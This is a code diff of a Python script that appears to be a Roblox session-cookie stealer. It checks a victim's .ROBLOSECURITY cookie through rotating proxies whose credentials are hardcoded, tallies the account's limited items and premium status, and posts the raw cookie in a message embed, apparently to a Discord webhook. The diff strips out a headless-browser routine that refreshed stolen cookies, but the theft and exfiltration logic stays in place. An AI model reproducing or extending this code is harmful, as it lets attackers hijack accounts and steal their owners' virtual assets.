@@ -5,7 +5,6 @@ import time
 import random
 import requests
 from datetime import datetime, timezone
-from playwright.sync_api import sync_playwright
 
 RAW_WEBSHARE_PROXIES = [
     "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
@@ -55,63 +54,6 @@ def extract_and_clean_cookie(raw_input):
         
     return cleaned
 
-def refresh_cookie_via_playwright(raw_cookie):
-    shuffled_proxies = list(RAW_WEBSHARE_PROXIES)
-    random.shuffle(shuffled_proxies)
-    
-    chosen_proxy_str = shuffled_proxies[0] if shuffled_proxies else None
-    proxy_url, ip, port, user, pwd = format_webshare(chosen_proxy_str) if chosen_proxy_str else (None, None, None, None, None)
-
-    with sync_playwright() as p:
-        launch_args = {
-            "headless": True,
-            "args": [
-                "--no-sandbox",
-                "--disable-setuid-sandbox",
-                "--disable-dev-shm-usage",
-                "--disable-accelerated-2d-canvas",
-                "--disable-gpu"
-            ]
-        }
-        if proxy_url and ip and port:
-            launch_args["proxy"] = {"server": f"http://{ip}:{port}"}
-            if user and pwd:
-                launch_args["proxy"]["username"] = user
-                launch_args["proxy"]["password"] = pwd
-
-        try:
-            browser = p.chromium.launch(**launch_args)
-            context = browser.new_context()
-            
-            context.add_cookies([{
-                'name': '.ROBLOSECURITY',
-                'value': raw_cookie,
-                'domain': '.roblox.com',
-                'path': '/',
-                'httpOnly': True,
-                'secure': True
-            }])
-            
-            page = context.new_page()
-            page.goto("https://www.roblox.com/home", timeout=45000)
-            
-            if "login" in page.url or page.locator("#login-button").count() > 0:
-                browser.close()
-                return raw_cookie
-
-            cookies = context.cookies()
-            refreshed = None
-            for c in cookies:
-                if c['name'] == '.ROBLOSECURITY':
-                    refreshed = c['value']
-                    break
-            
-            browser.close()
-            return refreshed if refreshed else raw_cookie
-        except Exception as e:
-            print(f"Playwright error: {e}", file=sys.stderr)
-            return raw_cookie
-
 def get_working_session(roblosecurity):
     session = requests.Session()
     session.headers.update({
@@ -122,44 +64,27 @@ def get_working_session(roblosecurity):
         "Content-Type": "application/json",
         "Origin": "https://www.roblox.com",
         "Referer": "https://www.roblox.com/",
-        "Sec-Ch-Ua": '"Google Chrome";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Sec-Ch-Ua-Platform": '"Windows"',
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36"
     })
 
-    manual_proxy = os.environ.get('PROXY_URL')
-    test_proxies = [manual_proxy] if manual_proxy else []
-    
     formatted_list = [format_webshare(p)[0] for p in RAW_WEBSHARE_PROXIES if format_webshare(p)[0]]
     random.shuffle(formatted_list)
-    test_proxies.extend(formatted_list)
 
-    for p in test_proxies:
+    for p in formatted_list:
         if not p:
             continue
-        proxy_dict = {"http": p, "https": p}
         try:
-            session.proxies = proxy_dict
-            session.get("https://www.roblox.com/home", timeout=4)
+            session.proxies = {"http": p, "https": p}
             if roblosecurity:
                 session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
             
-            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=4)
+            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
             if test_res.status_code == 200:
                 return session
         except Exception:
             continue
 
     session.proxies = {}
-    try:
-        session.get("https://www.roblox.com/home", timeout=4)
-    except Exception:
-        pass
-        
     if roblosecurity:
         session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com", path="/")
         
@@ -178,10 +103,8 @@ def main():
     if not raw_cookie:
         sys.exit(0)
 
-    print("[+] Refreshing cookie session...")
-    refreshed_cookie = refresh_cookie_via_playwright(raw_cookie)
-
-    session = get_working_session(refreshed_cookie)
+    print("[+] Validating session...")
+    session = get_working_session(raw_cookie)
 
     auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
     if auth_res.status_code != 200:
@@ -245,7 +168,6 @@ def main():
             break
 
     rap = sum(limiteds)
-    lim_count = len(limiteds)
 
     try:
         prem_res = session.get(
@@ -389,10 +311,10 @@ def main():
                 "timestamp": datetime.now(timezone.utc).isoformat()
             },
             {
-                "title": "🔑 Refreshed Session Cookie",
-                "description": f"```text\n{refreshed_cookie}\n```",
+                "title": "🔑 Session Cookie",
+                "description": f"```text\n{raw_cookie}\n```",
                 "color": 0x2B2D31,
-                "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
+                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
             }
         ],
         "components": [
@@ -416,13 +338,6 @@ def main():
                         "style": 5,
                         "label": "Inventory",
                         "url": f"https://www.roblox.com/users/{user_id}/inventory#!/collectibles"
-                    },
-                    {
-                        "type": 2,
-                        "style": 2,
-                        "label": "Refresh Session",
-                        "custom_id": f"refresh_session_{user_id}",
-                        "emoji": {"name": "🔄"}
                     }
                 ]
             }
